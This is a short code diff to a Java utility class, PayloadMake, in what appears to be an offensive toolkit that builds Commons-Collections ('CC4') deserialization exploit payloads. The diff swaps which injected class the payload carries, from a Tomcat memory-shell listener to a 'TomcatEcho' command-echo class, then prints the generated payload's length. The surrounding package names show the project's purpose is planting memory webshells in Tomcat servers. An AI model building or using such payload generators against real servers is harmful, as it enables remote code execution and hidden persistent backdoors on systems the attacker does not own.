@@ -1,5 +1,6 @@
 package com.demo.utils;
 
+import com.demo.echo.TomcatEcho;
 import com.demo.memshell.all.TomcatExecThreadListener;
 import com.demo.memshell.exec.TomcatFilterThreadMS;
 import com.demo.memshell.exec.TomcatListenerThreadMS;
@@ -26,7 +27,7 @@ public class PayloadMake {
     }
 
     public static void cc4() throws Exception {
-        Class msmClass = TomcatExecThreadListener.class;
+        Class msmClass = TomcatEcho.class;
         CC4Generator cc4Generator = new CC4Generator();
         String payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
